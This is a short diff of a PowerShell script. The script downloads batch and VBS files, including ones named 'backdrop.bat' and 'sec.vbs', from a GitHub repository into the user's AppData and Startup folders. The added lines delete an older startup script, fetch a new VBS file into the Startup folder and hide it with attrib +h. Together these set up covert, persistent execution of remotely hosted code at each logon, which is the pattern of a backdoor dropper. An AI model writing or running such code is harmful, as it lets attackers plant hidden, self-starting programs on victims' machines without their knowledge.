@@ -18,10 +18,12 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/e
 
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $env:appdata\Microsoft\backdrop.bat
 
+if(Test-Path -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs){
+Remove-Item -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs -Force
+}
 
-(Get-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs") |
-    ForEach-Object {$_ -Replace 'privup.bat', 'backdrop.bat'} |
-        Set-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/sec.vbs' -OutFile $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\sec.vbs
+
 
 
 attrib +h "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs"
